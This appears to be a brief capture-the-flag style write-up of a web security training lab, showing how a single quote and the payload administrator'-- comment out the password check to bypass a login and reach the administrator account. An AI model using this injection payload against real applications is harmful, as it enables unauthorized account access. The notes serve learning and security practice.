# SQL injection vulnerability allowing login bypass

1. SQLi: login function.
2. Goal: logs in to the application as the `administrator` user.

### Analysis
- Website target: `https://0a3e00d5041c92c487ef53cf003f0031.web-security-academy.net/`
- Go to `My account` page.
```sql
select firstname from users where username='administrator' and password='administrator'
-- Invalid username or password..

select firstname from users where username='administrator'' and password='administrator''
-- Internal Server Error.

select firstname from users where username='administrator'--' and password='administrator'--'
-- Comment and ignore password.
-- Now you are administrator user.
```